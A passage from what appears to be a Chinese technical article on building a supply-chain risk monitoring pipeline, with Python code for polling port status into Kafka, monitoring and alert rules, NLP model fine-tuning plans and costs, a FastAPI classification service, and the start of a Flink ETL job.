            <span class="hljs-string">'api'</span>: <span class="hljs-string">'https://api.shanghai-port.com/v1/status'</span>,
            <span class="hljs-string">'geo_key'</span>: [<span class="hljs-string">'China'</span>, <span class="hljs-string">'Shanghai'</span>]
        },
        <span class="hljs-string">'rotterdam'</span>: {
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'鹿特丹港'</span>,
            <span class="hljs-string">'api'</span>: <span class="hljs-string">'https://api.portofrotterdam.com/vessel'</span>,
            <span class="hljs-string">'geo_key'</span>: [<span class="hljs-string">'Netherlands'</span>, <span class="hljs-string">'Rotterdam'</span>]
        },
        <span class="hljs-string">'singapore'</span>: {
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'新加坡港'</span>,
            <span class="hljs-string">'api'</span>: <span class="hljs-string">'https://api.mpa.gov.sg/vessels'</span>,
            <span class="hljs-string">'geo_key'</span>: [<span class="hljs-string">'Singapore'</span>]
        },
        <span class="hljs-string">'suez'</span>: {
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'苏伊士运河'</span>,
            <span class="hljs-string">'api'</span>: <span class="hljs-string">'https://api.suez-canal.gov.eg/status'</span>,
            <span class="hljs-string">'geo_key'</span>: [<span class="hljs-string">'Egypt'</span>, <span class="hljs-string">'Suez'</span>]
        },
        <span class="hljs-string">'panama'</span>: {
            <span class="hljs-string">'name'</span>: <span class="hljs-string">'巴拿马运河'</span>,
            <span class="hljs-string">'api'</span>: <span class="hljs-string">'https://api.panama-canal.com/status'</span>,
            <span class="hljs-string">'geo_key'</span>: [<span class="hljs-string">'Panama'</span>]
        }
    }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, kafka_broker</span>):
        self.producer = KafkaProducer(
            bootstrap_servers=kafka_broker,
            value_serializer=<span class="hljs-keyword">lambda</span> x: json.dumps(x).encode(<span class="hljs-string">'utf-8'</span>)
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_port_status</span>(<span class="hljs-params">self, port_name, port_info</span>):
        <span class="hljs-string">"""获取港口状态"""</span>
        <span class="hljs-keyword">try</span>:
            response = requests.get(port_info[<span class="hljs-string">'api'</span>], timeout=<span class="hljs-number">10</span>)
            
            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
                data = response.json()
                
                <span class="hljs-comment"># 解析港口状态</span>
                status_event = {
                    <span class="hljs-string">'event_id'</span>: <span class="hljs-string">f"PORT_<span class="hljs-subst">{port_name}</span>_<span class="hljs-subst">{datetime.utcnow().timestamp()}</span>"</span>,
                    <span class="hljs-string">'ingest_timestamp'</span>: datetime.utcnow().isoformat(),
                    <span class="hljs-string">'risk_date'</span>: datetime.utcnow().date().isoformat(),
                    <span class="hljs-string">'source_type'</span>: <span class="hljs-string">'port_status'</span>,
                    <span class="hljs-string">'source_name'</span>: port_info[<span class="hljs-string">'name'</span>],
                    <span class="hljs-string">'source_url'</span>: port_info[<span class="hljs-string">'api'</span>],
                    <span class="hljs-string">'raw_text'</span>: json.dumps(data),
                    <span class="hljs-string">'language'</span>: <span class="hljs-string">'en'</span>,
                    <span class="hljs-string">'detected_geo_keys'</span>: port_info[<span class="hljs-string">'geo_key'</span>],
                    <span class="hljs-string">'keywords'</span>: [<span class="hljs-string">'port'</span>, <span class="hljs-string">'logistics'</span>, <span class="hljs-string">'shipping'</span>, port_name.lower()],
                    <span class="hljs-string">'nlp_processing_flag'</span>: <span class="hljs-literal">False</span>,
                    <span class="hljs-string">'processing_version'</span>: <span class="hljs-number">0</span>,
                    <span class="hljs-string">'confidence_raw'</span>: <span class="hljs-number">1.0</span>,
                    <span class="hljs-comment"># 港口特定信息</span>
                    <span class="hljs-string">'_port_name'</span>: port_name,
                    <span class="hljs-string">'_congestion_level'</span>: data.get(<span class="hljs-string">'congestion_level'</span>),  <span class="hljs-comment"># 拥堵程度</span>
                    <span class="hljs-string">'_vessels_waiting'</span>: data.get(<span class="hljs-string">'vessels_waiting'</span>, <span class="hljs-number">0</span>),
                    <span class="hljs-string">'_avg_wait_hours'</span>: data.get(<span class="hljs-string">'avg_wait_hours'</span>, <span class="hljs-number">0</span>),
                    <span class="hljs-string">'_operational_status'</span>: data.get(<span class="hljs-string">'status'</span>)  <span class="hljs-comment"># Operational/Limited/Closed</span>
                }
                
                self.producer.send(<span class="hljs-string">'port_logistics_status'</span>, value=status_event)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Error fetching port status for <span class="hljs-subst">{port_name}</span>: <span class="hljs-subst">{e}</span>'</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_continuous</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""每10分钟检查一次所有港口"""</span>
        <span class="hljs-keyword">import</span> schedule
        <span class="hljs-keyword">import</span> time
        
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">job</span>():
            <span class="hljs-keyword">for</span> port_name, port_info <span class="hljs-keyword">in</span> self.MAJOR_PORTS.items():
                self.fetch_port_status(port_name, port_info)
        
        schedule.every(<span class="hljs-number">10</span>).minutes.do(job)
        
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            schedule.run_pending()
            time.sleep(<span class="hljs-number">60</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    collector = PortStatusCollector(
        kafka_broker=<span class="hljs-string">'kafka1:9092,kafka2:9092,kafka3:9092'</span>
    )
    collector.run_continuous()
</code></pre>
<h4 data-id="heading-5">数据源监控与告警</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">配置所有数据源的健康监控:</span>

<span class="hljs-string">检查项:</span>
<span class="hljs-string">├─</span> <span class="hljs-string">API可用性</span> <span class="hljs-string">(每1小时检查)</span>
<span class="hljs-string">├─</span> <span class="hljs-string">数据新鲜度</span> <span class="hljs-string">(最后更新时间)</span>
<span class="hljs-string">├─</span> <span class="hljs-string">消息吞吐量</span> <span class="hljs-string">(每分钟消息数)</span>
<span class="hljs-string">└─</span> <span class="hljs-string">错误率</span> <span class="hljs-string">(API请求失败率)</span>

<span class="hljs-string">告警规则:</span>

<span class="hljs-attr">Rule 1:</span> <span class="hljs-string">数据源不可用</span>
<span class="hljs-string">├─</span> <span class="hljs-string">条件:</span> <span class="hljs-string">API响应</span> <span class="hljs-string">5xx错误</span> <span class="hljs-string">连续3次</span>
<span class="hljs-string">├─</span> <span class="hljs-string">级别:</span> <span class="hljs-string">P1</span>
<span class="hljs-string">├─</span> <span class="hljs-string">行动:</span> <span class="hljs-string">通知Tech</span> <span class="hljs-string">Lead</span> <span class="hljs-string">+</span> <span class="hljs-string">切换备用源</span>

<span class="hljs-attr">Rule 2:</span> <span class="hljs-string">数据延迟超标</span>
<span class="hljs-string">├─</span> <span class="hljs-string">条件:</span> <span class="hljs-string">最后更新时间</span> <span class="hljs-string">&gt;2小时</span>
<span class="hljs-string">├─</span> <span class="hljs-string">级别:</span> <span class="hljs-string">P2</span>
<span class="hljs-string">├─</span> <span class="hljs-string">行动:</span> <span class="hljs-string">通知数据工程师</span> <span class="hljs-string">+</span> <span class="hljs-string">检查API</span>

<span class="hljs-attr">Rule 3:</span> <span class="hljs-string">吞吐量异常下降</span>
<span class="hljs-string">├─</span> <span class="hljs-string">条件:</span> <span class="hljs-string">当前小时吞吐量</span> <span class="hljs-string">&lt;上周平均值的50%</span>
<span class="hljs-string">├─</span> <span class="hljs-string">级别:</span> <span class="hljs-string">P2</span>
<span class="hljs-string">├─</span> <span class="hljs-string">行动:</span> <span class="hljs-string">告警</span> <span class="hljs-string">+</span> <span class="hljs-string">日志分析</span>

<span class="hljs-string">Prometheus监控配置:</span>

<span class="hljs-string">```yaml</span>
<span class="hljs-attr">global:</span>
  <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">1m</span>

<span class="hljs-attr">scrape_configs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">'data_sources_health'</span>
    <span class="hljs-attr">static_configs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">'datasource-monitor:9090'</span>]
    <span class="hljs-attr">metrics_path:</span> <span class="hljs-string">'/metrics'</span>
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Grafana仪表板:</span>
├─ 所有数据源的实时状态
├─ 吞吐量折线图 (24小时)
├─ 延迟热力图
└─ 错误率趋势
</code></pre>
<h3 data-id="heading-6">NLP模型微调与完整部署</h3>
<h4 data-id="heading-7">NLP模型选型与采购</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">模型选择:</span>
<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">事件分类模型</span> <span class="hljs-string">(A/B/C/D四维)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">基础:</span> <span class="hljs-string">mBERT</span> <span class="hljs-string">(多语言)</span> <span class="hljs-string">/</span> <span class="hljs-string">XLM-RoBERTa</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">微调数据:</span> <span class="hljs-string">手工标注</span> <span class="hljs-number">5000</span><span class="hljs-string">+</span> <span class="hljs-string">条样本</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">A类</span> <span class="hljs-string">(物流中断):</span> <span class="hljs-number">1250</span><span class="hljs-string">条</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">B类</span> <span class="hljs-string">(监管限制):</span> <span class="hljs-number">1250</span><span class="hljs-string">条</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">C类</span> <span class="hljs-string">(政治不稳定):</span> <span class="hljs-number">1250</span><span class="hljs-string">条</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">D类</span> <span class="hljs-string">(金融冲击):</span> <span class="hljs-number">1250</span><span class="hljs-string">条</span>
   
   <span class="hljs-string">成本:</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">数据标注:</span> <span class="hljs-string">¥5万</span> <span class="hljs-string">(1000条/¥500)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">模型训练:</span> <span class="hljs-string">¥5万</span> <span class="hljs-string">(GPU租赁)</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">模型部署:</span> <span class="hljs-string">¥3万</span> <span class="hljs-string">(优化与版本管理)</span>

<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">命名实体识别模型</span> <span class="hljs-string">(NER)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">基础:</span> <span class="hljs-string">XLM-RoBERTa-large</span> <span class="hljs-string">(多语言强)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">微调数据:</span> <span class="hljs-number">3000</span><span class="hljs-string">+</span> <span class="hljs-string">句子标注</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">地点</span> <span class="hljs-string">(GPE/LOC):</span> <span class="hljs-string">港口、海峡、国家</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">组织</span> <span class="hljs-string">(ORG):</span> <span class="hljs-string">公司、政府机构</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">人物</span> <span class="hljs-string">(PER):</span> <span class="hljs-string">政治人物、CEO</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">商品</span> <span class="hljs-string">(PRODUCT):</span> <span class="hljs-string">石油、铁矿石等</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">准确度目标:</span> <span class="hljs-string">&gt;90%</span> <span class="hljs-string">F1</span> <span class="hljs-string">score</span>
   
   <span class="hljs-string">成本:</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">标注数据:</span> <span class="hljs-string">¥3万</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">模型训练:</span> <span class="hljs-string">¥2万</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">部署优化:</span> <span class="hljs-string">¥1万</span>

<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">情感分析模型</span> <span class="hljs-string">(金融领域)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">基础:</span> <span class="hljs-string">DistilBERT</span> <span class="hljs-string">(轻量级)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">微调数据:</span> <span class="hljs-number">2000</span><span class="hljs-string">+</span> <span class="hljs-string">金融新闻样本</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">标注维度:</span> <span class="hljs-string">正/中性/负</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">强度:</span> <span class="hljs-string">强/弱</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">金融特定:</span> <span class="hljs-string">机会/风险/中立</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">数据来源:</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">历史金融事件</span> <span class="hljs-string">(标注)</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">第三方数据集</span> <span class="hljs-string">(金融情感语料库)</span>
   <span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">众包标注</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">准确度目标:</span> <span class="hljs-string">&gt;85%</span>
   
   <span class="hljs-string">成本:</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">标注:</span> <span class="hljs-string">¥2万</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">训练:</span> <span class="hljs-string">¥1.5万</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">部署:</span> <span class="hljs-string">¥1万</span>

<span class="hljs-string">总NLP成本:</span> <span class="hljs-string">~¥20万</span> <span class="hljs-string">(M4-M5内完成)</span>
</code></pre>
<h4 data-id="heading-8">模型训练与优化流程</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">时间表:</span>

<span class="hljs-attr">Week 15-16:</span> <span class="hljs-string">数据准备与标注</span>
<span class="hljs-string">├─</span> <span class="hljs-string">准备训练数据</span> <span class="hljs-string">(5000条标注)</span>
<span class="hljs-string">├─</span> <span class="hljs-string">数据清洗与验证</span>
<span class="hljs-string">├─</span> <span class="hljs-string">拆分:</span> <span class="hljs-number">70</span><span class="hljs-string">%</span> <span class="hljs-string">train</span> <span class="hljs-string">/</span> <span class="hljs-number">15</span><span class="hljs-string">%</span> <span class="hljs-string">val</span> <span class="hljs-string">/</span> <span class="hljs-number">15</span><span class="hljs-string">%</span> <span class="hljs-string">test</span>
<span class="hljs-string">└─</span> <span class="hljs-string">保存为标准格式</span> <span class="hljs-string">(HuggingFace</span> <span class="hljs-string">datasets)</span>

<span class="hljs-attr">Week 17-18:</span> <span class="hljs-string">模型训练与评估</span>
<span class="hljs-string">├─</span> <span class="hljs-string">分类模型训练</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">基础模型:</span> <span class="hljs-string">mBERT</span> <span class="hljs-string">/</span> <span class="hljs-string">XLM-RoBERTa</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">训练参数:</span>
<span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-attr">Learning rate:</span> <span class="hljs-number">2e-5</span>
<span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-attr">Batch size:</span> <span class="hljs-number">32</span>
<span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-attr">Epochs:</span> <span class="hljs-number">3</span><span class="hljs-number">-5</span>
<span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-attr">Early stopping:</span> <span class="hljs-string">验证集无改进3个epoch停止</span>
<span class="hljs-string">│</span>  <span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-attr">Optimizer:</span> <span class="hljs-string">AdamW</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">评估指标:</span> <span class="hljs-string">Precision</span> <span class="hljs-string">/</span> <span class="hljs-string">Recall</span> <span class="hljs-string">/</span> <span class="hljs-string">F1</span> <span class="hljs-string">(各维度)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">目标:</span> <span class="hljs-string">整体准确度</span> <span class="hljs-string">&gt;95%</span>
<span class="hljs-string">│</span>
<span class="hljs-string">├─</span> <span class="hljs-string">NER模型训练</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">训练参数</span> <span class="hljs-string">(类似)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">评估:</span> <span class="hljs-string">token-level</span> <span class="hljs-string">F1,</span> <span class="hljs-string">entity-level</span> <span class="hljs-string">F1</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">目标:</span> <span class="hljs-string">&gt;90%</span> <span class="hljs-string">F1</span>
<span class="hljs-string">│</span>
<span class="hljs-string">├─</span> <span class="hljs-string">情感分析模型训练</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-number">3</span><span class="hljs-string">分类问题</span> <span class="hljs-string">(negative/neutral/positive)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">目标:</span> <span class="hljs-string">准确度</span> <span class="hljs-string">&gt;85%</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">关注:</span> <span class="hljs-string">金融特定短语的识别</span>
<span class="hljs-string">│</span>
<span class="hljs-string">├─</span> <span class="hljs-string">交叉验证与超参调优</span>
<span class="hljs-string">└─</span> <span class="hljs-string">对比多个模型选择最优</span>

<span class="hljs-attr">Week 19-20:</span> <span class="hljs-string">模型部署与推理优化</span>
<span class="hljs-string">├─</span> <span class="hljs-string">模型量化</span> <span class="hljs-string">(降低推理延迟)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">INT8量化</span> <span class="hljs-string">(推理延迟↓50%)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">知识蒸馏</span> <span class="hljs-string">(模型大小↓60%)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">混合精度训练</span>
<span class="hljs-string">├─</span> <span class="hljs-string">部署环境准备</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">GPU服务器配置</span> <span class="hljs-string">(如果有GPU)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">推理框架:</span> <span class="hljs-string">TorchServe</span> <span class="hljs-string">或</span> <span class="hljs-string">ONNX</span> <span class="hljs-string">Runtime</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">API包装</span> <span class="hljs-string">(FastAPI)</span>
<span class="hljs-string">├─</span> <span class="hljs-string">性能测试</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">吞吐量:</span> <span class="hljs-string">目标</span> <span class="hljs-string">&gt;1000条/秒</span> <span class="hljs-string">(分类)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">├─</span> <span class="hljs-string">延迟:</span> <span class="hljs-string">P99</span> <span class="hljs-string">&lt;100ms</span> <span class="hljs-string">(单条)</span>
<span class="hljs-string">│</span>  <span class="hljs-string">└─</span> <span class="hljs-string">资源占用:</span> <span class="hljs-string">GPU内存</span> <span class="hljs-string">&lt;4GB</span>
<span class="hljs-string">└─</span> <span class="hljs-string">模型版本管理</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">Model</span> <span class="hljs-string">Registry</span> <span class="hljs-string">(MLflow)</span>
   <span class="hljs-string">├─</span> <span class="hljs-string">版本追踪与回滚</span>
   <span class="hljs-string">└─</span> <span class="hljs-string">A/B测试框架</span>
</code></pre>
<p>推理服务代码示例:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
<span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> pipeline
<span class="hljs-keyword">import</span> uvicorn

app = FastAPI()

<span class="hljs-comment"># 加载模型</span>
classifier = pipeline(
    <span class="hljs-string">'zero-shot-classification'</span>,
    model=<span class="hljs-string">'xlm-roberta-large-finetuned-mgir'</span>,
    device=<span class="hljs-number">0</span>
)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TextInput</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    text: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassificationOutput</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    dimension: <span class="hljs-built_in">str</span>
    confidence: <span class="hljs-built_in">float</span>
    scores: <span class="hljs-built_in">dict</span>

<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">'/classify'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">classify_text</span>(<span class="hljs-params">input_data: TextInput</span>) -&gt; ClassificationOutput:
    candidate_labels = [
        <span class="hljs-string">'Physical logistics disruption'</span>,
        <span class="hljs-string">'Regulatory restrictions'</span>,
        <span class="hljs-string">'Political instability'</span>,
        <span class="hljs-string">'Financial crisis'</span>
    ]
    
    result = classifier(input_data.text, candidate_labels)
    
    dim_map = {
        <span class="hljs-string">'Physical logistics disruption'</span>: <span class="hljs-string">'A'</span>,
        <span class="hljs-string">'Regulatory restrictions'</span>: <span class="hljs-string">'B'</span>,
        <span class="hljs-string">'Political instability'</span>: <span class="hljs-string">'C'</span>,
        <span class="hljs-string">'Financial crisis'</span>: <span class="hljs-string">'D'</span>
    }
    
    <span class="hljs-keyword">return</span> ClassificationOutput(
        dimension=dim_map.get(result[<span class="hljs-string">'labels'</span>][<span class="hljs-number">0</span>]),
        confidence=result[<span class="hljs-string">'scores'</span>][<span class="hljs-number">0</span>],
        scores={
            <span class="hljs-string">'A'</span>: result[<span class="hljs-string">'scores'</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> result[<span class="hljs-string">'labels'</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">'Physical logistics disruption'</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'B'</span>: result[<span class="hljs-string">'scores'</span>][<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result[<span class="hljs-string">'labels'</span>]) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'C'</span>: result[<span class="hljs-string">'scores'</span>][<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result[<span class="hljs-string">'labels'</span>]) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'D'</span>: result[<span class="hljs-string">'scores'</span>][<span class="hljs-number">3</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result[<span class="hljs-string">'labels'</span>]) &gt; <span class="hljs-number">3</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        }
    )

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    uvicorn.run(app, host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>)
</code></pre>
<p>部署到Flink:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pyflink.datastream <span class="hljs-keyword">import</span> StreamExecutionEnvironment
<span class="hljs-keyword">from</span> pyflink.datastream.functions <span class="hljs-keyword">import</span> MapFunction
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NLPClassificationFunction</span>(<span class="hljs-title class_ inherited__">MapFunction</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, nlp_api_url=<span class="hljs-string">'http://nlp-service:8000'</span></span>):
        self.nlp_api_url = nlp_api_url
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">map</span>(<span class="hljs-params">self, element</span>):
        <span class="hljs-keyword">try</span>:
            text = element.get(<span class="hljs-string">'raw_text'</span>, <span class="hljs-string">''</span>)
            
            <span class="hljs-comment"># 调用NLP服务API</span>
            response = requests.post(
                <span class="hljs-string">f'<span class="hljs-subst">{self.nlp_api_url}</span>/classify'</span>,
                json={<span class="hljs-string">'text'</span>: text},
                timeout=<span class="hljs-number">5</span>
            )
            
            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
                nlp_result = response.json()
                element[<span class="hljs-string">'delivery_impact_dim'</span>] = nlp_result[<span class="hljs-string">'dimension'</span>]
                element[<span class="hljs-string">'confidence_score_nlp'</span>] = nlp_result[<span class="hljs-string">'confidence'</span>]
                element[<span class="hljs-string">'impact_severity_score'</span>] = self._calculate_severity(
                    nlp_result[<span class="hljs-string">'confidence'</span>],
                    element.get(<span class="hljs-string">'sentiment_score_nlp'</span>, <span class="hljs-number">0</span>)
                )
                element[<span class="hljs-string">'nlp_processing_flag'</span>] = <span class="hljs-literal">True</span>
                element[<span class="hljs-string">'processing_version'</span>] = <span class="hljs-number">1</span>
            
            <span class="hljs-keyword">return</span> element
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Error in NLP classification: <span class="hljs-subst">{e}</span>'</span>)
            <span class="hljs-keyword">return</span> element
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_severity</span>(<span class="hljs-params">self, confidence, sentiment</span>):
        <span class="hljs-string">"""计算严重度 (0-10)"""</span>
        base = confidence * <span class="hljs-number">10</span>
        <span class="hljs-keyword">if</span> sentiment &lt; -<span class="hljs-number">0.5</span>:
            base *= <span class="hljs-number">1.2</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(<span class="hljs-number">10.0</span>, base)
</code></pre>
<h3 data-id="heading-9">Flink任务完整化与Paimon数据验证</h3>
<h4 data-id="heading-10">完整的Flink ETL任务</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pyflink.datastream <span class="hljs-keyword">import</span> StreamExecutionEnvironment, KeyedStream
<span class="hljs-keyword">from</span> pyflink.datastream.functions <span class="hljs-keyword">import</span> (
    MapFunction, KeyedProcessFunction, WindowFunction
)
<span class="hljs-keyword">from</span> pyflink.datastream.connectors.kafka <span class="hljs-keyword">import</span> FlinkKafkaConsumer, FlinkKafkaProducer
<span class="hljs-keyword">from</span> pyflink.datastream.connectors.files <span class="hljs-keyword">import</span> FileSink
<span class="hljs-keyword">from</span> pyflink.datastream.formats.json <span class="hljs-keyword">import</span> JsonRowSerializationSchema
<span class="hljs-keyword">from</span> pyflink.datastream.window <span class="hljs-keyword">import</span> TumblingEventTimeWindow
<span class="hljs-keyword">from</span> pyflink.common.typeinfo <span class="hljs-keyword">import</span> Types
<span class="hljs-keyword">from</span> pyflink.common.watermark_strategy <span class="hljs-keyword">import</span> WatermarkStrategy
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CompleteFlinKETLPipeline</span>:
    <span class="hljs-string">"""完整的Flink ETL管道"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_environment</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""创建Flink环境"""</span>
        env = StreamExecutionEnvironment.get_execution_environment()
        
        <span class="hljs-comment"># 配置</span>
        env.set_parallelism(<span class="hljs-number">32</span>)
        env.enable_change_logs(<span class="hljs-literal">True</span>)
        env.set_default_savepoint_dir(<span class="hljs-string">'hdfs://namenode:8020/flink/savepoints'</span>)
        
        <span class="hljs-comment"># Checkpoint配置</span>
        <span class="hljs-keyword">from</span> pyflink.datastream.checkpoint_config <span class="hljs-keyword">import</span> CheckpointConfig
        checkpoint_config = CheckpointConfig()
        checkpoint_config.set_checkpointing_interval(<span class="hljs-number">60000</span>)  <span class="hljs-comment"># 60秒</span>
        checkpoint_config.set_checkpointing_mode(<span class="hljs-string">'EXACTLY_ONCE'</span>)
        checkpoint_config.set_checkpoint_timeout(<span class="hljs-number">600000</span>)  <span class="hljs-comment"># 10分钟</span>
        checkpoint_config.set_tolerable_checkpoint_failure_number(<span class="hljs-number">3</span>)
        env.enable_checkpointing_with_config(checkpoint_config)
        
        <span class="hljs-keyword">return</span> env
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_kafka_source</span>(<span class="hljs-params">self, env</span>):
        <span class="hljs-string">"""创建Kafka数据源"""</span>
        kafka_props = {
            <span class="hljs-string">'bootstrap.servers'</span>: <span class="hljs-string">'kafka1:9092,kafka2:9092,kafka3:9092'</span>,
            <span class="hljs-string">'group.id'</span>: <span class="hljs-string">'flink_etl_complete'</span>,
            <span class="hljs-string">'auto.offset.reset'</span>: <span class="hljs-string">'earliest'</span>
        }
        
        <span class="hljs-comment"># 消费多个Topic</span>
        topics = [
            <span class="hljs-string">'raw_news_events'</span>,
